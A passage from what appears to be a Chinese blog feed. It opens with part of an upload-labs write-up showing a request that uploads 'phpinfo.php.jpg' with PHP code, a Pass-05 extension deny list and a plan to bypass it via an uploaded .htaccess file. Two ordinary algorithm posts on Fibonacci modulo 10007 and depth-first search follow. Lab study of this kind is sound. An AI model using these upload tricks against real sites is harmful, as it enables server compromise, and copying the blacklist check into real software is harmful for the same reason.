class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;phpinfo.php.jpg&quot;</span></span><span class="language-php">Content-Type: application/octet-stream</span><span class="language-php"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span> </span><span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI</span><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><span class="language-php"></span><span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI--</span></code></pre></div><p><strong>在此我们认识到了一个更加有效的对抗文件上传漏洞的方案——以白名单代替黑名单</strong></p><h2 id="Pass-05">Pass-05</h2><p><strong>源码分析：</strong></p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>                <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><p>这里我们乍一看跟上面第四关的源码好像是一摸一样的，但是其pass的思路不大相同，再看看提示<br><strong>提示：上传目录存在php文件（readme.php）</strong><br>笔者的第一想法可能是设计&quot;文件包含(include)&quot;，有了大致思路我们可以再想想应该如何去include这个存在我们的一句话或者是phpinfo的文件并将其正常解析，以传统的经验来看我们可以尝试着上传<code>.htaccess</code>文件，以下笔者在此阐述什么是<code>.htaccess</code>文件以及为什么要这样去做</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次与Fibonacci斗智斗勇</title>
    <link href="/2025/05/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8EFibonacci%E6%96%97%E6%99%BA%E6%96%97%E5%8B%87/"/>
    <url>/2025/05/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8EFibonacci%E6%96%97%E6%99%BA%E6%96%97%E5%8B%87/</url>
    
    <content type="html"><![CDATA[<h2 id="楔子：">楔子：</h2><p>事必有因。近时方备战粤港澳信息学竞赛，适值主办方有其平台，故欲以其平台练题。然用之颇觉不堪，譬如一题所予提示甚少，题目分类未明，且大多无题解。此题吾亦屡试方解出，遂作此文，以便后学及自我温习。</p><span id="more"></span><p>那首先来看看这题目和出题人究竟时何方神圣</p><h2 id="题目描述：">题目描述：</h2><h3 id="LQ1005-入门训练Fibonacci数列">LQ1005:入门训练Fibonacci数列</h3><p>知识点:简单递归 C+±运算符和表达式概念</p><p>Fibonacci数列的递推公式为:Fn=Fn-1+Fn-2,其中F1=F2=1。<br>当n比较大时,Fn也非常大,现在我们想知道,Fn除以10007的余数是多少。</p><h4 id="输入格式">输入格式</h4><p><strong>输入描述:</strong><br>输入包含一个整数<code>n</code>。<br>输入样例:</p><div class="code-wrapper"><pre><code class="hljs">10</code></pre></div><h4 id="输出格式">输出格式</h4><p><strong>输出描述:</strong><br>输出一行,包含一个整数,表示<code>Fn</code>除以10007的余数。</p><p>说明:在本题中,答案是要求<code>Fn</code>除以10007的余数,因此我们只要能算出这个余数即可,<u>而不需要先计算出<code>Fn</code>的准确值,再将计算的结果除以10007取余</u> （记住这里后面要考）<br>数,直接计算余数往往比先算出原数再取余简单。<br>输出样例:</p><div class="code-wrapper"><pre><code class="hljs">55</code></pre></div><p>【提升】<br>HINT:时间限制:1.0s 内存限制:256.0MB<br>1≤n ≤ 1,000,000.</p><h2 id="分析">分析</h2><h3 id="初步分析">初步分析</h3><p>我们从题目中可以得知，这道题要求我们实现以下两个部分</p><ul><li>先实现求出斐波那契数列</li><li>再用所求出的数进行模10007后输出值</li></ul><p>那这样的话，我们的思路一般都是<s>一眼丁真</s> 一眼递归，那么我们可以写出如下代码：</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Fib</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-built_in">Fib</span>(n<span class="hljs-number">-1</span>)+<span class="hljs-built_in">Fib</span>(n<span class="hljs-number">-2</span>);&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    cout &lt;&lt; <span class="hljs-built_in">Fib</span>(n) &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>之后我们对其进行补充，加上让它模掉<code>10007</code>就可以了，prefect~</p><p>like this（在这里水一波字数）</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Fib</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-built_in">Fib</span>(n<span class="hljs-number">-1</span>)+<span class="hljs-built_in">Fib</span>(n<span class="hljs-number">-2</span>);&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    <span class="hljs-type">int</span> ans = <span class="hljs-built_in">Fib</span>(n)%<span class="hljs-number">10007</span>;    cout &lt;&lt; ans &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>根据我们的值这道题没有问题，不用2分钟就AC了，然而事情真就如此吗？</p><p>恰恰相反 实则不然 人之常情(bushi)</p><p>当我把题解放上去满心憧憬的时候</p><p>爆零了</p><p>！？</p><h2 id="解剖开始">解剖开始</h2><p>我们重新回到题目描述中，可以看到它的数据范围为1≤n ≤ 1,000,000，那如果我们直接输入1,000,000那就会。。。</p><div class="code-wrapper"><pre><code class="hljs zsh">➜  p1706 git:(master) ✗ ./a.out1000000[1]    59990 segmentation fault (core dumped)  ./a.out</code></pre></div><p>就会趋势</p><p>那既然超出了数值范围，那我们改成longlong试试</p><p>我们只得了300分。。。</p><p>也就是说我们是没有完全AC的，看了扣分点提示我们TLE了，根据目前的代码想想是哪里出了问题呢？</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    <span class="hljs-type">long</span> <span class="hljs-type">long</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">1</span>, c;      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>; i &lt;= n; i++) &#123;        c = a + b;         a = b;        b = c;    &#125;    cout &lt;&lt; b % <span class="hljs-number">10007</span> &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>输出内容是这样的</p><div class="code-wrapper"><pre><code class="hljs zsh">➜  p1706 git:(master) ✗ ./a.out     1000000-1044</code></pre></div><p>我们能明显的意识到它发生整数溢出了，是计算机中整数存储的典型表现：当数值超过数据类型能表示的最大正值时，会&quot;环绕&quot;到负值范围。但是明明我们都用上了<code>long long</code>了，但是为什么还发生了溢出？</p><p>那我们加大剂量</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">1e9</span> <span class="hljs-number">+7</span>; <span class="hljs-comment">// 防止数值溢出</span><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Matrix</span> &#123;    <span class="hljs-type">long</span> <span class="hljs-type">long</span> mat[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>];    <span class="hljs-built_in">Matrix</span>() &#123; mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]=mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>; mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>; &#125;&#125;;<span class="hljs-function">Matrix <span class="hljs-title">multiply</span><span class="hljs-params">(<span class="hljs-type">const</span> Matrix&amp; a, <span class="hljs-type">const</span> Matrix&amp; b)</span> </span>&#123;    Matrix res;    res.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = (a.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*b.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + a.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]*b.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) % MOD;    res.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = (a.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*b.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] + a.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]*b.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) % MOD;    res.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = (a.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]*b.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + a.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]*b.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) % MOD;    res.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = (a.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]*b.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] + a.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]*b.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) % MOD;    <span class="hljs-keyword">return</span> res;&#125;<span class="hljs-function">Matrix <span class="hljs-title">matrix_pow</span><span class="hljs-params">(Matrix a, <span class="hljs-type">int</span> n)</span> </span>&#123;    Matrix res;    res.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = res.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>; <span class="hljs-comment">// 初始化为单位矩阵</span>    res.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = res.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span>(n &gt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">if</span>(n &amp; <span class="hljs-number">1</span>) res = <span class="hljs-built_in">multiply</span>(res, a);        a = <span class="hljs-built_in">multiply</span>(a, a);        n &gt;&gt;= <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">return</span> res;&#125;<span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">fib</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    Matrix m;    m = <span class="hljs-built_in">matrix_pow</span>(m, n<span class="hljs-number">-1</span>);    <span class="hljs-keyword">return</span> m.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    cout &lt;&lt; <span class="hljs-built_in">fib</span>(n)%<span class="hljs-number">10007</span> &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>然后还是300分，原因。。。<code> 0Wrong AnswerRead 3057, expect 2091.</code></p><p>那我们再改改</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">fib</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-type">long</span> <span class="hljs-type">long</span> a = <span class="hljs-number">0</span>, b = <span class="hljs-number">1</span>, c;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++) &#123;        c = a + b;        a = b;        b = c;    &#125;    <span class="hljs-keyword">return</span> b;&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    <span class="hljs-type">int</span> ans = <span class="hljs-built_in">fib</span>(n)%<span class="hljs-number">10007</span>;    cout &lt;&lt; ans &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>好了，这次多了100分，看一眼报错<code>0Wrong Answer Read 4432, expect 6545.</code></p><h2 id="再看看题目描述呢？">再看看题目描述呢？</h2><h3 id="摘要">摘要</h3><p><strong>输出描述:</strong><br>输出一行,包含一个整数,表示<code>Fn</code>除以10007的余数。</p><p><u>说明:在本题中,答案是要求<code>Fn</code>除以10007的余数,因此我们只要能算出这个余数即可,而不需要先计算出<code>Fn</code>的准确值,再将计算的结果除以10007取余数,直接计算余数往往比先算出原数再取余简单。</u></p><p>在根据我们前面的尝试，得出这道题的AK思路应该是：</p><ol><li>使用迭代而非递归（O(n)时间）</li><li>每次加法后立即取模（防止溢出）</li></ol><p><strong>《每次加法后立即取模》</strong></p><p>也就是说一开始我们的分析中就错了一步，斐波那契数列增长速度极快，也就是说无论我们如何去补救，如果始终采取先求数再取模的话就会导致TLE！</p><p>所以真正的思路是这样的：</p><ol><li><strong>递归方法的问题</strong>：直接使用递归计算Fibonacci数列会导致指数级的时间复杂度（O(2^n)），当n较大时（如n=50），甚至不需要等到1000000就会使计算非常缓慢甚至栈溢出。</li><li><strong>迭代方法</strong>：使用循环从F1和F2逐步计算到Fn，时间复杂度为O(n)，适用于较大的n值。</li><li><strong>模运算性质</strong>：由于我们只需要结果对10007的余数，可以在每一步计算时都对10007取模，利用模运算的性质（(a + b) mod m = (a mod m + b mod m) mod m）防止数值溢出。</li></ol><p>那既然思路清楚了，我们可以给出真正的AC代码了！</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fibMod</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;    <span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">10007</span>;    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;        <span class="hljs-type">int</span> a = <span class="hljs-number">0</span>, b = <span class="hljs-number">1</span>, c;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; ++i) &#123;        c = (a + b) % MOD;  <span class="hljs-comment">// 每一步计算都取模防止溢出</span>        a = b;        b = c;    &#125;    <span class="hljs-keyword">return</span> b;&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    cout &lt;&lt; <span class="hljs-built_in">fibMod</span>(n)%<span class="hljs-number">10007</span> &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h2 id="总结">总结</h2><ul><li>看清数据范围</li><li>用迭代而不是递归</li><li>无需求出对应数而是每一步都进行取模</li><li>有一颗宁静的心</li></ul><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>由一道题引发对DFS的思考</title>
    <link href="/2025/05/17/NOIP-2002-%E6%99%AE%E5%8F%8A%E7%BB%84-%E9%80%89%E6%95%B0/"/>
    <url>/2025/05/17/NOIP-2002-%E6%99%AE%E5%8F%8A%E7%BB%84-%E9%80%89%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="NOIP-2002-普及组-选数">[NOIP 2002 普及组] 选数</h2><p>感觉过于标题的意思了，其实是由这道题来引出深度优先搜索(DFS)</p><h2 id="首先看看题目描述：">首先看看题目描述：</h2><h3 id="题目描述">题目描述</h3><p>已知 $\large n$ 个整数 $x_1,x_2,\cdots,x_n$，以及$1$个整数$k$($k&lt;n$)。从$n$ 个整数中任选 $k$个整数相加，可分别得到一系列的和。例如当$n=4$，$k=3$，$4$ 个整数分别为 $3,7,12,19$ 时，可得全部的组合与它们的和为：</p><p>$3+7+12=22$</p><p>$3+7+19=29$</p><p>$7+12+19=38$</p><p>$3+12+19=34$</p><p>现在，要求你计算出和为素数共有多少种。</p><span id="more"></span><p>例如上例，只有一种的和为素数：$3+7+19=29$。</p><h3 id="输入格式">输入格式</h3><p>第一行两个空格隔开的整数 $n,k$（$1 \le n \le 20$，$k&lt;n$）。</p><p>第二行 $n$ 个整数，分别为 $x_1,x_2,\cdots,x_n$（$1 \le x_i \le 5\times 10^6$）。</p><h3 id="输出格式">输出格式</h3><p>输出一个整数，表示种类数。</p><h3 id="输入输出样例-1">输入输出样例 #1</h3><h4 id="输入-1">输入 #1</h4><div class="code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">4 </span><span class="hljs-number">3</span><span class="hljs-symbol">3 </span><span class="hljs-number">7</span> <span class="hljs-number">12</span> <span class="hljs-number">19</span></code></pre></div><h4 id="输出-1">输出 #1</h4><div class="code-wrapper"><pre><code class="hljs">1</code></pre></div><h3 id="说明-提示">说明/提示</h3><p><strong>【题目来源】</strong></p><p>NOIP 2002 普及组第二题</p><hr><h2 id="具体分析：">具体分析：</h2><p>主要：是从给定的 <em>n</em> 个整数中任选 <em>k</em> 个整数进行相加，然后统计这些和中为素数的组合的数量。</p><h3 id="输入输出分析">输入输出分析</h3><ul><li><p><strong>输入</strong></p><ul><li>第一行包含两个用空格隔开的整数 <em>n</em> 和 <em>k</em>，其中 1≤<em>n</em>≤20 且 <em>k</em>&lt;<em>n</em>。<em>n</em> 表示整数的总数，<em>k</em> 表示需要选取的整数个数。</li><li>第二行包含 <em>n</em> 个整数 <em>x</em>1,<em>x</em>2,⋯,<em>x**n</em>，每个整数的范围是 1≤<em>x**i</em>≤5×106。</li></ul></li><li><p><strong>输出</strong></p></li><li><p>输出一个整数，表示和为素数的组合的种类数。</p></li></ul><h3 id="问题求解思路：">问题求解思路：</h3><p>要解决这个问题，主要分为以下两个关键按步骤：</p><ul><li>找出n个整数中选取的k个整数的所有组合并求和</li><li>判断每个组合的和是否是素数</li></ul><ol><li><h4 id="组合选取">组合选取</h4><p>对于n的范围较小 (1≤<em>n</em>≤20)，我们可以使用深度优先搜索算法来枚举所有可能的组合。在此笔者阐述以下什么是深度优先搜素(DFS)算法</p><h6 id="tips-佬们如果已经了解相关内容可用右侧的那个什么栏进行跳过">tips: 佬们如果已经了解相关内容可用右侧的那个什么栏进行跳过</h6><p>深度优先搜索是一种通过递归的方式遍历所有可能状态或搜索树/图的算法，非常适合解决组合问题，其核心思想是 <strong>尽可能深地探索当前路径，直到无法继续前进时才回溯</strong>。深度优先搜索具有以下三个特点：</p><ul><li>递归实现：纯天然适合递归（函数调用栈自动处理回溯）</li><li>回溯机制：当一条路走到尽头时，返回上一个分叉点</li><li>时间复杂度：通常为$O(b**d)$ ，b 是分支因子，d是最大深度</li></ul><p><em><strong>结合例题：在全排列问题中的应用</strong></em><br><a href="https://www.luogu.com.cn/problem/P1706">P1706 全排列问题</a></p></li></ol><ul><li><p><strong>问题分析</strong></p><ul><li>目标：生成1到n的所有排列（共n!种）</li><li>关键约束：每个字只能使用一次</li><li>输出要求：按字典顺序排列</li></ul></li><li><p><strong>DFS解决思路：</strong></p><p>(1) <strong>状态标识</strong>：</p><ul><li>当前已选择的数字序列<code>path</code></li><li>记录数字是否已经使用的数字<code>used</code>(从而避免重复)</li></ul><p>(2) <strong>递归过程</strong>：</p><ul><li>终止条件：<code>path</code>长度等于<code>n</code>时输出结果</li><li>遍历选择：对于每个未使用的数字加入数组<code>path</code>并递归</li><li>回溯：走到尽头后返回上一个分叉点然后尝试新选择</li></ul></li></ul><p>以下是我的代码实现，但是写了太垃圾用AI优化了以下</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><span class="hljs-type">int</span> used[<span class="hljs-number">15</span>];      <span class="hljs-comment">// 标记数字是否使用过</span><span class="hljs-type">int</span> perm[<span class="hljs-number">15</span>];      <span class="hljs-comment">// 当前排列</span><span class="hljs-type">int</span> n;<span class="hljs-comment">// 打印当前排列</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_perm</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i) &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%5d&quot;</span>, perm[i]); <span class="hljs-comment">// 保持5字符场宽</span>    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);&#125;<span class="hljs-comment">// 深度优先搜索生成排列</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> depth)</span> </span>&#123; <span class="hljs-comment">// depth表示当前处理的位置</span>    <span class="hljs-keyword">if</span> (depth &gt; n) &#123;  <span class="hljs-comment">// 已生成完整排列</span>        <span class="hljs-built_in">print_perm</span>();        <span class="hljs-keyword">return</span>;    &#125;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num = <span class="hljs-number">1</span>; num &lt;= n; ++num) &#123; <span class="hljs-comment">// 尝试每个数字</span>        <span class="hljs-keyword">if</span> (!used[num]) &#123;                <span class="hljs-comment">// 如果该数字未使用</span>            used[num] = <span class="hljs-number">1</span>;               <span class="hljs-comment">// 